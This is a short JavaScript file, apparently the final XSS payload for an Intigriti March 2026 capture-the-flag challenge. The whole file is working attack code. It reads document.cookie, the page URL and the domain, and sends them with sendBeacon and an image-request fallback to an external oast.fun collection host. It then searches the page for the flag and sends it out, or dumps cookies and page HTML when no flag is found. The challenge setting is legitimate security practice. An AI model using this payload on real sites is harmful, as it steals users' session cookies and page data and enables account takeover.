// Intigriti March 2026 - Final Payload
alert("🎉 XSS Success! Intigriti March Challenge");

console.log("Cookies:", document.cookie);

// Best way to exfil without CORS issues
function exfil(data) {
    const payload = JSON.stringify(data);
    
    // Try sendBeacon (best)
    if (navigator.sendBeacon) {
        navigator.sendBeacon("https://ybfttwhjfsrzfyyuvtjuu0z3r714v9smj.oast.fun/exfil", payload);
    }
    
    // Fallback with Image
    const img = new Image();
    img.src = "https://ybfttwhjfsrzfyyuvtjuu0z3r714v9smj.oast.fun/exfil?data=" + encodeURIComponent(payload);
}

// Send cookies + location
exfil({
    cookies: document.cookie,
    url: location.href,
    domain: document.domain
});

// Hunt for the flag
setTimeout(() => {
    let flag = document.cookie.match(/flag=([^;]+)/i)?.[1] ||
               document.cookie.match(/INTIGRITI\{[^}]+\}/)?.[0] ||
               document.body.innerText.match(/INTIGRITI\{[^}]+\}/)?.[0];

    if (flag) {
        alert("🚩 FLAG FOUND!\n" + flag);
        
        exfil({ flag: flag });
    } else {
        // If no flag yet, dump everything
        exfil({ fullCookies: document.cookie, htmlSnippet: document.body.innerHTML.substring(0, 500) });
    }
}, 1000);
